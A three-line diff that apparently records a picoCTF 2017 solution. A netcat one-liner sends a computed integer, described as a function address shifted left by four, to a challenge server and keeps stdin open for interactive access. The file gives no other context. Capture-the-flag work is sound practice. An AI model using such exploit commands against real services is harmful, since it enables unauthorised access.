@@ -1,0 +1,3 @@
+(python -c "print '-2142743888'"; cat -) | nc shell2017.picoctf.com 49258
+
+address of function << 4 = -2142743888
